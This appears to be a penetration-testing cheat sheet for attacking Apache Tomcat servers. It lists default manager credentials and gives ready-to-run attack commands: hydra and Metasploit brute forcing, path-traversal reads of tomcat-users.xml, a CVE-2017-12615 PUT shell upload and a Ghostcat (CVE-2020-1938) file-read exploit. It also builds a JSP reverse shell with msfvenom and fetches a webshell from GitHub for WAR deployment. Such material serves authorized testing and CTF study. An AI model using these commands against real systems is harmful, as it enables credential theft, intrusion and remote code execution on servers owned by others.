###     Key Files
- `conf/tomcat-users.xml` - Contains users and roles
- `webapps/APP/WEB-INF/web.xml` - Application configuration
- `webapps/APP/WEB-INF/classes/` - Compiled Java classes


### Default credentials:
- `tomcat:tomcat`
- `admin:admin`
- `role1:role1`
- `both:tomcat`

```bash
# Brute Force 
hydra -L users.txt -P passwords.txt target http-get /manager/html

# Extract Credentials from tomcat-users.xml If you have LFI:
curl http://target/vuln.jsp?file=../../../../conf/tomcat-users.xml

# CVE-2017-12615 (PUT Method RCE)
curl -X PUT http://target:8080/shell.jsp/ -d @shell.jsp
```

## Reverse Shell (After login)
```bash
# Create JSP shell:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f war > shell.war

# Alternative JSP Shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r shell.war cmd.jsp
```
- Access /manager/html
- Upload WAR file
- Access deployed shell at /shell/


### Brute Force Attacks
- msfconsole
```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <target_ip>
set RPORT <port>
set STOP_ON_SUCCESS true
set VHOST <domain_if_needed>
run
```
- python script
```bash
python3 tomcat_brute.py -U http://target:8080 -P /manager/html -u users.txt -p passwords.txt
```
 
 ## Ghostcat Exploit (CVE-2020-1938)
 ```bash
 # Exploit (LFI)
 # https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
 python2 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/web.xml
```



##### Roles explained:
- `manager-gui`: access /manager/html
- `manager-script`: HTTP API access
- `manager-status`: status page only
- `admin-gui`: full admin access